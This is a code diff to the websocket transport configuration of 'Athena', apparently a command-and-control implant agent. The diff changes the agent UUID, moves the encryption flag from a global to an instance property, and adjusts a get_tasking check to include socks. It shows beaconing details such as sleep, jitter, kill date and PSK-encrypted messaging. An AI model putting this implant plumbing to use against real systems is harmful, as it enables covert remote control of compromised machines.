@@ -1,7 +1,6 @@
 ﻿using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
-using System.Collections.Generic;
 using System.IO;
 using System.Net.WebSockets;
 using System.Text;
@@ -28,7 +27,7 @@ namespace Athena.Config
             //int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             //this.jitter = jitter;
             //this.currentConfig = new Websocket(this.uuid);
-            this.uuid = "e8e0ee61-089e-4820-a263-c1277c369307";
+            this.uuid = "b3b72cb5-8e39-498f-9b27-525d05ac394e";
             this.killDate = DateTime.Parse("2022-08-25");
             int sleep = int.TryParse("0", out sleep) ? sleep : 60;
             this.sleep = sleep;
@@ -52,6 +51,7 @@ namespace Athena.Config
         public bool encryptedExchangeCheck { get; set; }
         public ClientWebSocket ws { get; set; }
         public PSKCrypto crypt { get; set; }
+        public bool encrypted { get; set; }
 
         public Websocket(string uuid)
         {
@@ -74,7 +74,8 @@ namespace Athena.Config
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
-                Globals.encrypted = true;
+                //Globals.encrypted = true;
+                this.encrypted = true;
             }
 
             this.ws = new ClientWebSocket();
@@ -105,12 +106,12 @@ namespace Athena.Config
             {
                 string json = JsonConvert.SerializeObject(obj);
 
-                //if (json != "{\"action\":\"get_tasking\",\"tasking_size\":-1,\"delegates\":[]}")
-                //{
-                //    Console.WriteLine(json);
-                //}
+                if (json != "{\"action\":\"get_tasking\",\"tasking_size\":-1,\"socks\":[],\"delegates\":[]}")
+                {
+                    //Console.WriteLine(json);
+                }
 
-                if (Globals.encrypted)
+                if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
                 }
@@ -131,7 +132,7 @@ namespace Athena.Config
                 message = await Receive(ws);
                 m = JsonConvert.DeserializeObject<WebSocketMessage>(message);
 
-                if (Globals.encrypted)
+                if (this.encrypted)
                 {
                     return this.crypt.Decrypt(m.Data);
                 }
